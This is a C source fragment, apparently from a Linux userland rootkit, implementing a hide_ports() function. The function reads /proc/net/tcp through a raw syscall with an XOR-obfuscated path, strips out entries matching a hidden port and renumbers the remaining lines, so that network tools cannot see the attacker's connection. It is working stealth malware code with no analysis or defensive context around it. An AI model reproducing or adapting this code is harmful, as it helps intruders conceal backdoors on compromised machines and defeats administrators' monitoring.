#include "../rkconsts.h"

int hide_ports() {
    DEBUG_MSG("[-] hide_ports() called\n");
    char buf[200];

    char *proc_net_tcp = strdup(PROC_NET_TCP); xor(proc_net_tcp);
    char hidden_port_hex[5];
    sprintf(hidden_port_hex, "%x", HIDDEN_PORT);
    FILE *tmp_fp = tmpfile();
    int tcp_fd = syscall(2, proc_net_tcp, O_RDONLY);

    FILE *tcp_fp = fdopen(tcp_fd, "r");
    int num_lines = 0;
    int num_skipped = 0;

    while (fgets(buf, sizeof(buf), tcp_fp) != NULL) {
        if (strstr(buf, hidden_port_hex) != NULL) {
            num_skipped++;
            num_lines++;
            continue;
        }
        else {
            if (num_skipped == 0) {
                fputs(buf, tmp_fp);
            }
            else {
                // Modify the indices of the lines to hide the deleted line
                char tmpbuf[200];
                sprintf(tmpbuf, "%d%s", num_lines-num_skipped, strchr(buf, ':'));
                fputs(tmpbuf, tmp_fp);
            }
        }
        num_lines++;
    }
    fclose(tcp_fp);
    fseek(tmp_fp, 0, SEEK_SET);
    CLEAN(proc_net_tcp);
    return fileno(tmp_fp);
}